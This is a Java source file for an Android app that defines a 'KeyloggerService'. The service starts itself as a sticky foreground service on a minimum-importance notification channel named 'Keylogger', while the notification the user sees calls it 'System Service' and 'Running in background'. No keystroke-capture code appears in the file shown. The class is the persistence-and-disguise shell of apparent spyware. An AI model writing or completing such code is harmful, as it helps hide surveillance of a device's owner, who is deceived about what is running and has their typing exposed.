package com.xrc.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import androidx.core.app.ServiceCompat;

import com.xrc.system.core.Constants;
import com.xrc.system.ui.MainActivity;

public class KeyloggerService extends Service {
    private static final String TAG = Constants.TAG + ":KeySvc";
    private static final String KEY_CHANNEL = Constants.CHANNEL_ID + "_key";
    private static final int FGS_TYPE_SPECIAL_USE = 1 << 12;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        ServiceCompat.startForeground(this, Constants.NOTIF_ID_CORE + 10, buildNotification(), FGS_TYPE_SPECIAL_USE);
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(KEY_CHANNEL, "Keylogger",
                    NotificationManager.IMPORTANCE_MIN);
            ch.setDescription("Keylogger service");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, KEY_CHANNEL)
                .setContentTitle("System Service")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentIntent(pi)
                .setOngoing(true)
                .build();
    }
}
